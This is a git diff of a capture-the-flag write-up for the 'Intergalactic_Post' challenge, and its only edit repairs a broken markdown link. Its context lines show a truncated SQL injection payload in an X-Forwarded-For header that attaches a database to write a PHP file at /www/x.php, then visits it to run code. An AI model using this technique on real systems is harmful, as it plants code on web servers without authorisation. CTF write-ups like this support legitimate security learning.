@@ -137,4 +137,4 @@ X-Forwarded-For: ','a');ATTACH DATABASE '/www/x.php' AS x;INSERT INTO x.p (d) VA
 Now we just have to visit /x.php with our browser to trigger our code.
 ![flagpoc](https://github.com/apostolides/ctf-writeups/blob/master/Cyber-Apocalypse-2022/Intergalactic_Post/flag.png)
 
-Special thanks to [sealmove]([https://www.google.com](https://github.com/sealmove/) for helping with this challenge.
+Special thanks to [sealmove](https://github.com/sealmove/) for helping with this challenge.
